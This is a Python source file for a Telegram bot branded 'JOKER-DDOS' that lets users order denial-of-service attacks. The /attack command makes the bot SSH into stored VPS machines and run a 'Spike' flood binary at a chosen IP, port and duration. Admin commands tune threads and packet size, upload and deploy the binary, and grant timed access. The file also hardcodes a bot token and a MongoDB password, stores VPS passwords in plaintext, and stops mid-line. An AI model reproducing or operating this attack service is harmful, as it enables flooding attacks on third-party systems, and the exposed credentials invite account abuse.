import logging
import datetime
import asyncio
from pymongo import MongoClient
from telegram import Update
from telegram.ext import Application, CommandHandler, CallbackContext
import asyncssh
from telegram import Update, Document
from telegram.ext import Application, CommandHandler, MessageHandler, filters, CallbackContext
from pymongo import MongoClient
import time
from telegram import InlineKeyboardButton, InlineKeyboardMarkup
from telegram.helpers import escape_markdown
from bson import Binary
from telegram.ext import CallbackQueryHandler
from telegram.error import TelegramError
from telegram.constants import ParseMode

# Configure logging
logging.basicConfig(level=logging.INFO, format="%(asctime)s - %(levelname)s - %(message)s")
logger = logging.getLogger(__name__)

TELEGRAM_BOT_TOKEN = '7795656753:AAEXIcf65IPpEh-69XcF4YxqK7OJkgEH9oU'  
MONGO_URI = "mongodb+srv://KalkiGamesYT:Redardo2305@test.hmv7x.mongodb.net/?retryWrites=true&w=majority&appName=Test"  # Replace with your MongoDB URI
DB_NAME = "TEST"
VPS_COLLECTION_NAME = "vps_list"
SETTINGS_COLLECTION_NAME = "settings"
USERS_COLLECTION_NAME = "broadcast"

client = MongoClient(MONGO_URI)
db = client[DB_NAME]
settings_collection = db[SETTINGS_COLLECTION_NAME]
vps_collection = db[VPS_COLLECTION_NAME]
users_collection = db[USERS_COLLECTION_NAME]

ADMIN_USER_ID = 7795055510  # Replace with your admin user ID
# A dictionary to track the last attack time for each user (Cooldown starts after attack completion)
last_attack_time = {}
SSH_SEMAPHORE = asyncio.Semaphore(100)

# Updated start function with Help button
async def start(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    user_id = update.effective_user.id
    username = update.effective_user.username
    first_name = update.effective_user.first_name

    # Define buttons for regular users
    user_keyboard = [
        [
            InlineKeyboardButton("❓ Help", callback_data="help"),
        ]
    ]
    admin_keyboard = [
        [
            InlineKeyboardButton("❓ Help", callback_data="help"),
        ]
    ]

    # Choose the appropriate keyboard
    keyboard = admin_keyboard if user_id == ADMIN_USER_ID else user_keyboard
    reply_markup = InlineKeyboardMarkup(keyboard)

    # Enhanced message
    message = (
        "🔥 *Welcome to the Battlefield!* 🔥\n\n"
        "⚔️ Prepare for war! Use the buttons below to begin."
    )

    # Save or update the user in the database
    users_collection.update_one(
        {"user_id": user_id},  # Match by user_id
        {
            "$set": {
                "user_id": user_id,
                "chat_id": chat_id,
                "username": username,
                "first_name": first_name,
            }
        },
        upsert=True  # Insert if not found
    )

    await context.bot.send_message(chat_id=chat_id, text=message, parse_mode="Markdown", reply_markup=reply_markup)


async def button_handler(update: Update, context: CallbackContext):
    query = update.callback_query
    await query.answer()  # Acknowledge the callback

    if query.data == "show_settings":
        await show_settings(update, context)
    elif query.data == "start_attack":
        await context.bot.send_message(
            chat_id=query.message.chat_id,
            text="*⚠️ Use /attack <ip> <port> <duration>*",
            parse_mode="Markdown"
        )
    elif query.data == "setup":
        await context.bot.send_message(
            chat_id=query.message.chat_id,
            text="*ℹ️ Use /setup commands to set up VPS for attack.*",
            parse_mode="Markdown"
        )
    elif query.data == "configure_vps":
        await context.bot.send_message(
            chat_id=query.message.chat_id,
            text="*🔧 Use /add_vps to configure your VPS settings.*",
            parse_mode="Markdown"
        )
    elif query.data == "vps_status":
        await context.bot.send_message(
            chat_id=query.message.chat_id,
            text="*🔧 Use /vps_status to see VPS details.*",
            parse_mode="Markdown"
        )
    user_id = update.effective_user.id

    # Define help menu for users and admins
    user_help_text = (
                "ℹ️ *Help Menu*\n\n"
                "*🔸 /attack <ip> <port> <duration>* - Launch an attack.\n"
            )

    admin_help_text = (
            "ℹ️ *Help Menu*\n\n"
            "*🔸 /add_vps* - Add your VPS for attacks.\n"
            "*🔸 /setup* - Set up your VPS for attack configuration.\n"
            "*🔸 /attack <ip> <port> <duration>* - Launch an attack.\n"
            "*🔸 /vps_status* - Check the status of your VPS.\n"
            "*🔸 /show* - View attack settings.\n"
            "*🔸 /add <user_id> <expiry_time>* - Add a user with access.\n"
            "*🔸 /remove <user_id>* - Remove a user.\n"
            "*🔸 /users* - List users with access.\n"
            "*🔸 /broadcast <message>* - Send a message to all users.\n"
            "*🔸 /broadcast_media* - Send media to all users.\n\n"
            "*🔸 /byte <size>* - Set the packet size for attacks.\n"
            "*🔸 /thread <count>* - Set the thread count for attacks.\n"
            "*🔸 /upload* - Upload required files for attacks.\n\n"
            "For more commands, contact the admin."
        )
    # Determine which help text to send
    help_text = admin_help_text if user_id == ADMIN_USER_ID else user_help_text

    await context.bot.send_message(
        chat_id=query.message.chat_id,
        text=help_text,
        parse_mode="Markdown"
    )
    
async def broadcast_media(update: Update, context: CallbackContext):
    """Broadcast media (photo/video/document) to all users."""
    if update.effective_user.id != ADMIN_USER_ID:
        await update.message.reply_text("❌ You are not authorized to use this command.")
        return

    if not update.message.photo and not update.message.video and not update.message.document:
        await update.message.reply_text("⚠️ Please send a photo, video, or document with /broadcast_media.")
        return

    users = users_collection.find()
    success_count = 0
    failure_count = 0

    for user in users:
        try:
            chat_id = user.get("chat_id")
            if not chat_id:
                continue  

            if update.message.photo:
                file_id = update.message.photo[-1].file_id
                await context.bot.send_photo(chat_id=chat_id, photo=file_id)

            elif update.message.video:
                file_id = update.message.video.file_id
                await context.bot.send_video(chat_id=chat_id, video=file_id)

            elif update.message.document:
                file_id = update.message.document.file_id
                await context.bot.send_document(chat_id=chat_id, document=file_id)

            success_count += 1
        except Exception as e:
            print(f"Failed to send media to {user.get('user_id', 'unknown')} due to {e}")
            failure_count += 1

    await update.message.reply_text(
        text=f"✅ *Media Broadcast completed!*\n📤 Sent to: {success_count}\n❌ Failed: {failure_count}",
        parse_mode=ParseMode.MARKDOWN,
    )

async def vps_status(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    user_id = update.effective_user.id

    # Fetch the user's VPS details
    vps_data = vps_collection.find_one({"user_id": user_id})

    if not vps_data:
        await context.bot.send_message(
            chat_id=chat_id,
            text=(
                "❌ *No VPS configured!*\n"
                "Use /add_vps to add your VPS details and get started."
            ),
            parse_mode="Markdown",
        )
        return

    # Extract VPS details
    ip = vps_data.get("ip", "N/A")
    username = vps_data.get("username", "N/A") 
    message = (
        "🌐 *VPS Status:*\n"
        f"🖥️ *IP Address:* `{ip}`\n"
        f"👤 *Username:* `{username}`\n\n"
        "Use /addvps to update your VPS details if needed."
    )
    await context.bot.send_message(chat_id=chat_id, text=message, parse_mode="Markdown")

async def set_thread(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    user_id = update.effective_user.id

    if user_id != ADMIN_USER_ID:
        await context.bot.send_message(chat_id=chat_id, text="*❌ You are not authorized to use this command!*", parse_mode='Markdown')
        return

    if len(context.args) != 1:
        await context.bot.send_message(chat_id=chat_id, text="*⚠️ Usage: /thread <number>*", parse_mode='Markdown')
        return

    try:
        threads = int(context.args[0])
        settings_collection.update_one(
            {},
            {"$set": {"threads": threads}},
            upsert=True
        )
        await context.bot.send_message(chat_id=chat_id, text=f"*✅ Thread count set to {threads}!*", parse_mode='Markdown')
    except ValueError:
        await context.bot.send_message(chat_id=chat_id, text="*⚠️ Please provide a valid number for threads!*", parse_mode='Markdown')


async def set_byte(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    user_id = update.effective_user.id

    if user_id != ADMIN_USER_ID:
        await context.bot.send_message(chat_id=chat_id, text="*❌ You are not authorized to use this command!*", parse_mode='Markdown')
        return

    if len(context.args) != 1:
        await context.bot.send_message(chat_id=chat_id, text="*⚠️ Usage: /byte <number>*", parse_mode='Markdown')
        return

    try:
        packet_size = int(context.args[0])
        settings_collection.update_one(
            {},
            {"$set": {"packet_size": packet_size}},
            upsert=True
        )
        await context.bot.send_message(chat_id=chat_id, text=f"*✅ Packet size set to {packet_size} bytes!*", parse_mode='Markdown')
    except ValueError:
        await context.bot.send_message(chat_id=chat_id, text="*⚠️ Please provide a valid number for packet size!*", parse_mode='Markdown')
async def show_settings(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    user_id = update.effective_user.id

    # Check if the user is the admin
    if user_id != ADMIN_USER_ID:
        await context.bot.send_message(chat_id=chat_id, text="*❌ You are not authorized to use this command!*", parse_mode='Markdown')
        return
    
    # Retrieve the current settings from MongoDB
    settings = settings_collection.find_one()  # Get the first (and only) document in the settings collection
    
    if not settings:
        await context.bot.send_message(chat_id=chat_id, text="*❌ Settings not found!*", parse_mode='Markdown')
        return
    
    threads = settings.get("threads", "Not set")
    packet_size = settings.get("packet_size", "Not set")
    
    # Send the settings to the user
    message = (
        f"*⚙️ Current Settings:*\n"
        f"*Threads:* {threads}\n"
        f"*Packet Size:* {packet_size} bytes"
    )
    await context.bot.send_message(chat_id=chat_id, text=message, parse_mode='Markdown')

async def add_vps(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    user_id = update.effective_user.id

    args = context.args
    if len(args) != 3:
        await context.bot.send_message(chat_id=chat_id, text="*⚠️ Usage: /add_vps <ip> <username> <password>*", parse_mode='Markdown')
        return

    ip, username, password = args

    # Check if the user already has a VPS entry
    existing_vps = vps_collection.find_one({"user_id": user_id})
    if existing_vps:
        message = "*♻️ Existing VPS replaced with new details!*"
    else:
        message = "*✅ New VPS added successfully!*"

    # Update or insert the VPS information
    vps_collection.update_one(
        {"user_id": user_id},
        {"$set": {"ip": ip, "username": username, "password": password}},
        upsert=True
    )

    await context.bot.send_message(chat_id=chat_id, text=message, parse_mode='Markdown')

async def attack(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    user_id = update.effective_user.id

    # Admin should never be restricted
    if user_id == ADMIN_USER_ID:
        max_duration = None  # No limit for admin
        cooldown_time = 0  # No cooldown for admin
    else:
        max_duration = 120  # Max attack duration for regular users
        cooldown_time = 300  # Cooldown period for regular users
    
    current_time = time.time()
    if user_id in last_attack_time and current_time - last_attack_time[user_id] < cooldown_time:
        remaining_cooldown = cooldown_time - (current_time - last_attack_time[user_id])
        await context.bot.send_message(
            chat_id=chat_id,
            text=f"*❌ You must wait {int(remaining_cooldown)} seconds before launching another attack.*",
            parse_mode="Markdown"
        )
        return

    args = context.args
    if len(args) != 3:
        await context.bot.send_message(
            chat_id=chat_id,
            text="*⚠️ Usage: /attack <ip> <port> <duration>*",
            parse_mode="Markdown"
        )
        return

    target_ip, port, duration = args
    port = int(port)
    duration = int(duration)
    
    # Restrict attack duration for non-admins
    if max_duration and user_id != ADMIN_USER_ID and duration > max_duration:
        await context.bot.send_message(
            chat_id=chat_id,
            text=f"*❌ You can't attack for more than {max_duration} seconds!*",
            parse_mode="Markdown"
        )
        return

    vps_data = vps_collection.find_one({"$or": [
        {"user_id": user_id},
        {"friends": {"$elemMatch": {"user_id": user_id, "expiry": {"$gte": datetime.datetime.utcnow()}}}}
    ]})

    if not vps_data:
        await context.bot.send_message(
            chat_id=chat_id,
            text="*❌ You don't have access to any VPS. Contact the owner or use /add_vps.*",
            parse_mode="Markdown"
        )
        return

    settings = settings_collection.find_one() or {}
    threads = settings.get("threads", 10)
    packet_size = settings.get("packet_size", 512)

    await context.bot.send_message(
        chat_id=chat_id,
        text=(
            f"*⚔️ Attack Launched! ⚔️*\n"
            f"*🎯 Target: {target_ip}:{port}*\n"
            f"*🕒 Duration: {duration} seconds*\n"
            f"*💥 Powered By JOKER-DDOS*"
        ),
        parse_mode="Markdown",
    )

    asyncio.create_task(run_ssh_attack(vps_data, target_ip, port, duration, threads, packet_size, chat_id, context))
    last_attack_time[user_id] = current_time


async def run_ssh_attack(vps_data, target_ip, port, duration, threads, packet_size, chat_id, context):
    """Run the SSH attack command with throttling."""
    async with SSH_SEMAPHORE:  # Limit concurrent SSH connections
        try:
            async with asyncssh.connect(
                vps_data["ip"],
                username=vps_data["username"],
                password=vps_data["password"],
                known_hosts=None
            ) as conn:
                command = f"./Spike {target_ip} {port} {duration} {packet_size} {threads}"
                result = await conn.run(command, check=True)
                await context.bot.send_message(
                    chat_id=chat_id,
                    text="*✅ Attack completed successfully!*",
                    parse_mode="Markdown"
                )
        except asyncssh.Error as e:
            logger.error(f"SSH Error: {e}")
            await context.bot.send_message(
                chat_id=chat_id,
                text=f"*❌ SSH Error: {str(e)}*",
                parse_mode="Markdown"
            )
        except Exception as e:
            logger.error(f"General Error: {e}")
            await context.bot.send_message(
                chat_id=chat_id,
                text=f"*❌ Error: {str(e)}*",
                parse_mode="Markdown"
            )

# Command for admins to upload the Spike binary
async def upload(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    user_id = update.effective_user.id

    if user_id != ADMIN_USER_ID:
        await context.bot.send_message(chat_id=chat_id, text="❌ *You are not authorized to use this command!*", parse_mode="Markdown")
        return

    await context.bot.send_message(chat_id=chat_id, text="✅ *Send the Spike binary now.*", parse_mode="Markdown")

# Handle binary file uploads
async def handle_file_upload(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    user_id = update.effective_user.id

    if user_id != ADMIN_USER_ID:
        await context.bot.send_message(chat_id=chat_id, text="❌ *You are not authorized to upload files!*", parse_mode="Markdown")
        return

    document = update.message.document
    if document.file_name != "Spike":
        await context.bot.send_message(chat_id=chat_id, text="❌ *Please upload the correct file (Spike binary).*", parse_mode="Markdown")
        return

    file = await context.bot.get_file(document.file_id)
    file_content = await file.download_as_bytearray()

    # Replace the old binary with the new one in MongoDB
    result = settings_collection.update_one(
        {"name": "binary_spike"},  # Query by a unique identifier
        {"$set": {"binary": Binary(file_content)}},  # Replace the binary content with the new one
    )

    if result.matched_count > 0:
        await context.bot.send_message(chat_id=chat_id, text="✅ *Spike binary replaced successfully.*", parse_mode="Markdown")
    else:
        await context.bot.send_message(chat_id=chat_id, text="❌ *Failed to replace the binary. No matching document found.*", parse_mode="Markdown")

async def setup(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    user_id = update.effective_user.id

    # Fetch the user's VPS details
    vps_data = vps_collection.find_one({"user_id": user_id})

    if not vps_data:
        await context.bot.send_message(
            chat_id=chat_id,
            text=escape_markdown("❌ No VPS configured! Add your VPS details and get started."),
            parse_mode="Markdown",
        )
        return

    # Fetch the stored Spike binary from MongoDB
    spike_binary_doc = settings_collection.find_one({"name": "binary_spike"})
    if not spike_binary_doc:
        await context.bot.send_message(
            chat_id=chat_id,
            text=escape_markdown("❌ No Spike binary found! Admin must upload it first."),
            parse_mode="Markdown",
        )
        return

    spike_binary = spike_binary_doc["binary"]
    ip = vps_data.get("ip")
    username = vps_data.get("username")
    password = vps_data.get("password")

    try:
        async with asyncssh.connect(
            ip,
            username=username,
            password=password,
            known_hosts=None  # Disable host key checking
        ) as conn:
            await context.bot.send_message(
                chat_id=chat_id,
                text=escape_markdown("🔄 Uploading Spike binary..."),
                parse_mode="Markdown",
            )

            # Upload the Spike binary
            async with conn.start_sftp_client() as sftp:
                async with sftp.open("Spike", "wb") as remote_file:
                    await remote_file.write(spike_binary)

            # Set permissions for the uploaded Spike binary
            await conn.run("chmod +x Spike", check=True)

            await context.bot.send_message(
                chat_id=chat_id,
                text=escape_markdown("✅ Spike binary uploaded and permissions set successfully."),
                parse_mode="Markdown",
            )

    except asyncssh.Error as e:
        await context.bot.send_message(
            chat_id=chat_id,
            text=escape_markdown(f"❌ SSH Error: {str(e)}"),
            parse_mode="Markdown",
        )
    except Exception as e:
        await cont
